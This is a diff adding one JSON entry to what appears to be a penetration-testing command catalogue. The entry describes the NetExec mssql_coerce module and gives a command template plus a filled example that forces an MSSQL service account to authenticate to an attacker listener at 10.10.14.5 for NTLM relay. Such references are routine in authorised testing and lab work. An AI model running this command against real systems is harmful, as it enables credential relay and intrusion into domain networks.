@@ -1,0 +1,13 @@
+{
+  "id": "nxc-mssql-coerce",
+  "name": "NetExec mssql_coerce Module",
+  "command": "nxc mssql <target> -u '<user>' -p '<password>' -M mssql_coerce -o LISTENER=<attacker-ip>",
+  "description": "Coerce the MSSQL service account to authenticate to your relay listener via xp_dirtree / xp_subdirs / xp_fileexist. Lights up the path to NTLM relay against any SQL service account that's actually a domain account.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["mssql"],
+  "tags": ["netexec", "nxc", "mssql", "coerce", "ntlm-relay"],
+  "examples": [
+    "nxc mssql 10.10.10.10 -u sa -p 'Password123!' --local-auth -M mssql_coerce -o LISTENER=10.10.14.5"
+  ]
+}
